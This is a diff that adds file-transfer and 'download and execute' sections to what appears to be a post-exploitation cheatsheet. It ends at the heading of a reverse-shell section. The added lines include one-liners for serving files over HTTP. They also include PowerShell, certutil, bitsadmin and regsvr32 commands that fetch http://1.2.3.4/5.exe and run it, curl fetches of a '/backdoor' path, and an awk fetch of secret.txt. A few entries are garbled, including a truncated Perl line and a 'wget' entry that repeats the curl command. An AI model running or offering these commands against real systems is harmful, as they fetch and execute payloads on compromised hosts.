@@ -17,6 +17,94 @@
 
 ## cheetsheet 
 
+### File transfer
+
+#### python
+
+```python
+python -m SimpleHTTPServer 8000
+```
+
+#### php 5.4+
+
+```php
+php -S 0.0.0.0:8000
+```
+
+#### ruby
+
+```ruby
+ruby -rwebrick -e'WEBrick::HTTPServer.new(:Port => 1337, :DocumentRoot => Dir.pwd).start'
+```
+
+#### runby 1.9.2+
+
+```ruby
+ ruby -run -e httpd . -p 1337
+ ```
+ 
+ #### perl
+ 
+ ```perl
+perl -MHTTP::Server::Brick -e '$s=HTTP::Server::Brick->new(port=>1337); $s->mount("/"=>{path=>"."}); $s->start'
+```
+
+```perl
+perl -MIO::All -e 'io(":8080")->fork->accept->(sub { $_[0] < io(-x $1 +? "./$1 |"
+```
+
+### Download Files
+
+#### powershell: download and execute
+
+```powershell
+powershell (new-object System.Net.WebClient).DownloadFile('http://1.2.3.4/5.exe','c:\download\a.exe');start-process 'c:\download\a.exe'
+```
+
+#### certutil: download and execute
+
+```
+certutil -urlcache -split -f http://1.2.3.4/5.exe c:\download\a.exe&&c:\download\a.exe
+```
+
+#### bitsadmin：download and execute 
+
+```
+bitsadmin /transfer n http://1.2.3.4/5.exe c:\download\a.exe && c:\download\a.exe
+```
+
+#### regsvr32
+
+```
+regsvr32 /u /s /i:http://1.2.3.4/5.exe scrobj.dl
+```
+
+#### curl 
+
+```
+curl http://1.2.3.4/backdoor
+```
+
+#### wget
+
+```
+curl http://1.2.3.4/backdoor
+```
+
+#### awk
+
+```
+awk 'BEGIN {
+  RS = ORS = "\r\n"
+  HTTPCon = "/inet/tcp/0/127.0.0.1/1337"
+  print "GET /secret.txt HTTP/1.1\r\nConnection: close\r\n"    |& HTTPCon
+  while (HTTPCon |& getline > 0)
+      print $0
+  close(HTTPCon)
+}'
+```
+[more](https://xax007.github.io/2019-01-13-post-exploitation-file-transfer-tips/)
+
 ### 反弹 shell
 
 #### Bash 
